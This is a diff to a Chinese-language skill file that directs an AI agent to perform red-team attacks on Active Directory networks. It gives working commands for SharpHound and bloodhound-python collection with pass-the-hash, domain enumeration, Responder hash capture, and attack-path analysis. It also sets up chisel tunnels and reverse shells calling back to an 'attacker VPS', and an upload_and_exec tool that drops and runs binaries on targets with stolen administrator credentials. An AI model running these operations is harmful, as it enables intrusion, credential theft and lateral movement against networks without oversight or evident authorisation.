@@ -1,6 +1,6 @@
-﻿---
+---
 name: redteam
-description: RedTeam penetration testing agent skill. Use this for network scanning, web fingerprinting, vulnerability detection, AD domain attacks, lateral movement, credential harvesting, browser information extraction with tools like gogo, fscan, httpx, nuclei, ffuf, dnsx, kerbrute, nxc, impacket, playwright.
+description: RedTeam penetration testing agent skill. Use this for network scanning, web fingerprinting, vulnerability detection, AD domain attacks, lateral movement, credential harvesting, proxy setup with tools like gogo, fscan, httpx, nuclei, ffuf, dnsx, kerbrute, nxc, impacket, SharpHound, pywerview, ldapdomaindump, responder, playwright, chisel.
 ---
 
 #  AI 执行的底层通用指导原则
@@ -323,15 +323,227 @@ description: RedTeam penetration testing agent skill. Use this for network scann
 
 ---
 
-### bloodhound-python (AD 权限图谱收集)
+### bloodhound-python (AD 权限图谱收集 - Linux/macOS)
+
+**二进制路径**: Python 模块（`pip install bloodhound`）
+
+> 适用于从 Linux/Mac 机器或没有 Windows 域环境的机器上收集 AD 数据。
 
   # 收集所有 AD 数据
   bloodhound-python -d corp.local -u lowpriv_user -p password -dc 192.168.1.10 -c All --zip
 
-  # 只收集会话和 ACL
+  # 只收集会话和 ACL（轻量级）
   bloodhound-python -d corp.local -u user -p pass -dc 192.168.1.10 -c Session,ACL
 
+  # 只收集组和信任关系
+  bloodhound-python -d corp.local -u user -p pass -dc 192.168.1.10 -c Group,Trusts
+
+  # 使用哈希认证
+  bloodhound-python -d corp.local -u user -hashes :NTHASH -dc 192.168.1.10 -c All --zip
+
 ---
+
+##  工具八：SharpHound (AD 权限图谱收集 - Windows)
+
+**二进制路径**: d:\mcp\redteam-tools\SharpHound.exe
+
+> SharpHound 是 BloodHound 的官方 Windows 收集器，性能更优，支持更多 Windows 特有数据收集。
+> 适用于已获得 Windows 主机权限的场景，可直接在域内机器上运行。
+
+**核心参数**：
+
+| 参数 | 说明 |
+|------|------|
+| `-c <CollectionMethod>` | 收集方法：Default / All / Session / SessionLoop / LoggedOn / ACL / ObjectProps / GPOAnalytic / RDP / DCOM / LocalAdmin / PSRemote / Carstein / Trusts / Default / DCOnly |
+| `-d <Domain>` | 指定目标域（如 corp.local） |
+| `-dc <DomainController>` | 指定域控（可多个，逗号分隔） |
+| `-u / -username <user>` | 认证用户名 |
+| `-p / -password <pass>` | 认证密码 |
+| `-Hashes <LMHASH:NTHASH>` | NTLM 哈希认证 |
+| `-k / -kerberos` | 使用 Kerberos 认证（支持票据） |
+| `-o <outputfolder>` | 输出目录（默认当前目录） |
+| `--zipfilename <name>` | 指定 ZIP 输出文件名 |
+| `-t <timeout>` | 每个请求超时秒数（默认 60） |
+| `--throttle` | 启用节流模式（减少网络流量） |
+| `--randomizefilenames` | 随机化输出文件名 |
+| `--skipRegistryCheck` | 跳过注册表检查 |
+| `--collectAllProperties` | 收集所有对象属性（更慢但更全） |
+| `--dns Servers=<ip1,ip2>` | 指定 DNS 服务器 |
+| `--ldapfilter <filter>` | 自定义 LDAP 过滤条件 |
+| `-v` | 详细输出 |
+
+**收集方法详解**：
+
+| 收集方法 | 收集内容 | 适用场景 |
+|----------|----------|----------|
+| `Default` | 组、成员、本地组成员、会话、ACL、对象属性、信任、GPO | 标准推荐 |
+| `All` | 所有收集类型 | 最全面渗透测试 |
+| `Session` | 用户-计算机会话关系 | 找活跃用户路径 |
+| `SessionLoop` | 循环收集会话（配合长期监听） | 捕获登录会话 |
+| `LoggedOn` | 已登录用户（需管理员权限） | 找高价值目标 |
+| `ACL` | ACL/ACE 权限分析 | 找权限滥用路径 |
+| `ObjectProps` | 对象属性扩展 | 找密码属性 |
+| `GPOAnalytic` | GPO 有效权限分析 | 找 GPO 攻击路径 |
+| `RDP` | RDP 会话关系 | 找远程桌面路径 |
+| `DCOM` | DCOM 对象信息 | 找 COM 滥用路径 |
+| `LocalAdmin` | 本地管理员 | 找本机权限 |
+| `PSRemote` | PSRemote/WinRM 会话 | 找远程管理路径 |
+| `Trusts` | 域信任关系 | 跨域攻击分析 |
+| `DCOnly` | 只连接 DC（不扫描客户端） | DC 数据快速收集 |
+
+**实战指令**：
+
+  # 标准收集（推荐）- 生成一个 ZIP 文件
+  SharpHound.exe -c Default -d corp.local
+
+  # 完整收集（最全面）
+  SharpHound.exe -c All -d corp.local
+
+  # 收集会话信息（找用户-计算机映射）
+  SharpHound.exe -c Session -d corp.local
+
+  # 使用凭据收集（域内任意机器运行）
+  SharpHound.exe -c Default -d corp.local -u lowpriv_user -p password
+
+  # 使用哈希收集（Pass-the-Hash）
+  SharpHound.exe -c Default -d corp.local -u Administrator -Hashes :NTHASH
+
+  # 使用 Kerberos 票据收集
+  SharpHound.exe -c Default -d corp.local -k
+
+  # 指定域控和输出目录
+  SharpHound.exe -c Default -d corp.local -dc 192.168.1.10 -o "C:\Windows\Temp\BHDATA"
+
+  # 指定自定义输出文件名
+  SharpHound.exe -c All -d corp.local --zipfilename bloodhound_data
+
+  # 指定多个域控
+  SharpHound.exe -c Default -d corp.local -dc DC01.corp.local,DC02.corp.local
+
+  # 使用 DNS 服务器
+  SharpHound.exe -c Default -d corp.local --dns 8.8.8.8
+
+**注意事项**：
+- SharpHound 生成的 ZIP 文件需要导入到 **BloodHound GUI** (Linux/Windows) 进行分析
+- 默认输出 `*.json` 文件和压缩的 `.zip` 文件
+- 在被发现的概率较高，建议配合长期监听 `SessionLoop` 模式
+- `-c All` 会触发大量 LDAP 查询，可能被安全设备检测
+
+**与 bloodhound-python 对比**：
+
+| 特性 | SharpHound (Windows) | bloodhound-python (跨平台) |
+|------|---------------------|---------------------------|
+| 平台 | Windows | Linux/macOS/Windows |
+| 性能 | 更优 | 一般 |
+| LocalAdmin 收集 | 支持 | 不支持 |
+| LoggedOn 收集 | 支持 | 不支持 |
+| GPOAnalytic | 支持 | 不支持 |
+| 运行位置 | 需 Windows 机器 | 任意平台 |
+
+---
+
+## 工具九：pywerview (域信息枚举)
+
+**Python 包**: `pip install pywerview`
+
+> PowerView.py 的 Python 实现，无需 PowerShell，直接在任意平台枚举域信息。
+> 是域渗透中最重要的侦查工具之一。
+
+**子命令**：
+
+| 子命令 | 说明 |
+|--------|------|
+| `get-domain-user` | 枚举域用户 |
+| `get-domain-computer` | 枚举域计算机 |
+| `get-domain-group` | 枚举域组 |
+| `get-domain-group-member` | 获取组成员 |
+| `get-domain-share` | 枚举共享 |
+| `get-domain-gpo` | 枚举 GPO |
+| `get-domain-trust` | 获取域信任 |
+| `get-net-localgroup` | 获取本地组 |
+| `get-net-session` | 获取会话 |
+| `get-net-loggedon` | 获取登录用户 |
+| `find-local-admin` | 寻找本地管理员 |
+
+**实战指令**：
+
+  # 枚举域用户
+  pywerview.py get-domain-user -d corp.local --dc-ip 192.168.1.10 -u user -p pass
+
+  # 枚举域计算机
+  pywerview.py get-domain-computer -d corp.local --dc-ip 192.168.1.10 -u user -p pass
+
+  # 枚举域组及成员
+  pywerview.py get-domain-group -d corp.local --dc-ip 192.168.1.10 -u user -p pass
+
+  # 获取 Domain Admins 成员
+  pywerview.py get-domain-group-member -d corp.local --dc-ip 192.168.1.10 -u user -p pass --group-name "Domain Admins"
+
+  # 枚举共享
+  pywerview.py get-domain-share -d corp.local --dc-ip 192.168.1.10 -u user -p pass
+
+  # 寻找本地管理员
+  pywerview.py find-local-admin -d corp.local --dc-ip 192.168.1.10 -u user -p pass
+
+---
+
+## 工具十：ldapdomaindump (LDAP 域信息转储)
+
+**Python 包**: `pip install ldapdomaindump`
+
+> 将域信息转储为 HTML/JSON/CSV 格式，便于分析和报告生成。
+
+**实战指令**：
+
+  # 基本转储
+  ldapdomaindump ldap://192.168.1.10 -u 'corp\user' -p 'password' -o ./ldapdump
+
+  # 只输出 JSON
+  ldapdomaindump ldap://192.168.1.10 -u 'corp\user' -p 'password' -o ./ldapdump --json
+
+  # 禁用彩色输出
+  ldapdomaindump ldap://192.168.1.10 -u 'corp\user' -p 'password' -o ./ldapdump -n
+
+**输出文件**：
+
+| 文件 | 说明 |
+|------|------|
+| domain_users.html | 域用户列表 |
+| domain_computers.html | 域计算机列表 |
+| domain_groups.html | 域组列表 |
+| domain_trusts.html | 域信任关系 |
+| domain_policy.html | 域策略 |
+
+---
+
+## 工具十一：Responder (LLMNR/NBT-NS 欺骗)
+
+**Python 包**: `pip install responder`
+
+> 在内网中监听 LLMNR/NBT-NS/mDNS 广播，欺骗认证，捕获 NetNTLMv1/v2 哈希。
+> 可用于哈希重放攻击或离线破解。
+
+**重要提示**：
+
+> ⚠️ Responder 是监听型工具，必须配合 `invoke_responder` MCP 工具使用（后台运行 + 超时）。
+
+**参数**：
+
+| 参数 | 说明 |
+|------|------|
+| `-I <interface>` | 监听网卡（IP 或名称） |
+| `-w` | 开启 WPAD 代理服务器 |
+| `-F` | 强制 NTLM 认证 |
+| `--lm` | 强制 LM 哈希（更易破解） |
+| `-v` | 详细输出 |
+
+**实战指令**：
+
+  # 启动 Responder（使用 MCP 工具自动后台运行）
+  invoke_responder(listen_if="192.168.1.100")
+
+  # 查看捕获的哈希
+  # Hashes 保存在: /usr/share/responder/logs/
 
 ### Impacket  Kerberoasting / AS-REP Roasting
 
@@ -388,4 +600,166 @@ description: RedTeam penetration testing agent skill. Use this for network scann
 
 ---
 
-### nc chisel 
+## 工具九：BloodHound 数据分析 (AD 权限图谱分析器)
+
+**脚本路径**: d:\mcp\redteam-server\bloodhound_analysis.py
+
+> SharpHound/bloodhound-python 只负责收集数据，此工具负责分析数据、生成攻击路径报告。
+> AI 可以直接调用此工具，获得类似 BloodHound GUI 的分析结果！
+
+**分析方法**：
+
+1. SharpHound/bloodhound-python 收集数据（生成 JSON 文件）
+2. 将 JSON 文件所在目录路径传给分析工具
+3. 获取完整分析报告，包含攻击路径发现
+
+**分析报告内容**：
+
+| 报告章节 | 分析内容 |
+|----------|----------|
+| 环境概览 | 域/用户/计算机/组数量统计 |
+| 高价值目标 | Domain Admins、Enterprise Admins 等特权账户 |
+| 会话分析 | 用户-计算机会话映射，找活跃用户 |
+| 本地管理员 | 哪些用户是哪些机器的本地管理员 |
+| 组关系 | 特权组成员关系分析 |
+| ACL 分析 | 危险权限（WriteDacl/WriteOwner 等） |
+| 域信任 | 跨域信任关系和攻击面 |
+| GPO 分析 | 组策略对象分析 |
+| 远程会话 | PSRemote/RDP 会话关系 |
+| 攻击路径 | Kerberoast/AS-REP Roastable 发现 |
+
+**完整工作流示例**：
+
+  # 第一步：收集 AD 数据（使用 SharpHound）
+  SharpHound.exe -c All -d corp.local -o "d:\bh_collect"
+
+  # 第二步：分析收集的数据
+  # AI 调用 invoke_bloodhound_analysis(data_path="d:\bh_collect")
+  # AI 将获得完整的攻击路径分析报告！
+
+  # 报告示例：
+  # ======================================================
+  #            BLOODHOUND AD 权限图谱分析报告
+  # ======================================================
+  #
+  # 【1. 环境概览】
+  # --------------------------------------------------
+  #   域数量:      1
+  #   用户数量:    156
+  #   计算机数量:  89
+  #   ...
+  #
+# 【10. 攻击路径总结 (Attack Path Summary)】
+# --------------------------------------------------
+#   [CRITICAL] 发现 3 条域管会话
+#   [HIGH] 发现 5 个用户是多台机器的本地管理员
+#   [MEDIUM] 发现 12 个 SPN 用户 (可 Kerberoast)
+
+---
+
+## 工具十：代理自动化搭建 (Proxy Setup)
+
+**脚本路径**: d:\mcp\redteam-server\proxy_setup.py
+
+> 在获得内网主机权限后，需要搭建代理访问其他网段时使用。AI 会自动生成上传命令和执行指令！
+
+**支持的代理工具**：
+
+| 工具 | 说明 | 适用场景 |
+|------|------|----------|
+| chisel | 高性能 HTTP over TCP 隧道（推荐） | 端口转发、快速上线 |
+| nc | 传统 Netcat 反向 shell | 简单连接、快速上线 |
+| powershell | PowerShell 反向 shell | 无工具上传、绕过限制 |
+
+**MCP 工具**: `invoke_proxy_setup`
+
+**完整工作流示例**：
+
+  # 场景：已获得 192.168.1.100 的权限，想通过它访问 10.10.10.0/24 网段
+  # 攻击者 VPS: 1.2.3.4
+
+  # AI 调用代理搭建工具：
+  invoke_proxy_setup(
+    tool="chisel",
+    target_ip="1.2.3.4",      # 攻击者 VPS IP
+    target_port=8080,           # 攻击者监听端口
+    listen_port=8080,          # chisel 客户端监听端口
+    os_type="windows"
+  )
+
+  # AI 将获得完整的搭建方案：
+
+  # ======================================================
+  #           代理自动化搭建报告 (Proxy Setup Report)
+  # ======================================================
+  #
+  # 工具类型:      CHISEL
+  # 目标系统:      WINDOWS
+  # 目标 IP:       1.2.3.4
+  # 目标端口:      8080
+  # 监听端口:      8080
+  #
+  # 【1. 二进制文件信息】
+  # --------------------------------------------------
+  #   filename:   chisel.exe
+  #   size:       10612224 bytes
+  #   md5:        xxxxxxxxxxxxxxxx
+  #   base64:     TVRoQAAAAAAA... (完整 Base64 编码)
+  #
+  # 【2. 上传方法】
+  # --------------------------------------------------
+  #   方法1: PowerShell Base64 上传
+  #   方法2: 直接下载 (如果有 Web 服务)
+  #
+  # 【3. 执行命令】
+  # --------------------------------------------------
+  #   1. 攻击者启动: chisel.exe server --port 8080 --reverse
+  #   2. 目标执行: chisel.exe client 1.2.3.4:8080 R:8080
+  #
+  # ======================================================
+
+**代理搭建后访问内网**：
+
+```bash
+# 通过代理访问 10.10.10.0/24 网段
+# 方法1: proxychains
+proxychains4 nxc smb 10.10.10.50 -u Administrator -p 'Pass123!'
+
+# 方法2: chisel SOCKS5 代理
+# 攻击者设置: chisel server --port 8080 --socks5
+# 目标设置: chisel client 1.2.3.4:8080 R:1080:socks
+# 然后配置浏览器/SocksCap 使用 127.0.0.1:1080
+```
+
+---
+
+## 工具十一：文件上传与执行 (Upload & Exec)
+
+**MCP 工具**: `upload_and_exec`
+
+> 将文件上传到目标机器并可选执行。配合代理搭建使用！
+
+**参数说明**：
+
+| 参数 | 说明 |
+|------|------|
+| target | 目标 IP |
+| username | 认证用户名 |
+| password | 认证密码 |
+| local_file | 本地文件路径 |
+| remote_path | 目标保存路径 |
+| exec_command | 上传后执行的命令 |
+
+**使用示例**：
+
+  # 上传 chisel.exe 到目标机器
+  upload_and_exec(
+    target="192.168.1.100",
+    username="Administrator",
+    password="Pass123!",
+    local_file="d:\\mcp\\redteam-tools\\chisel.exe",
+    remote_path="C:\\Windows\\Temp\\chisel.exe",
+    exec_command="C:\\Windows\\Temp\\chisel.exe client 1.2.3.4:8080 R:8080"
+  )
+
+  # AI 会生成 Base64 上传命令和执行方案！
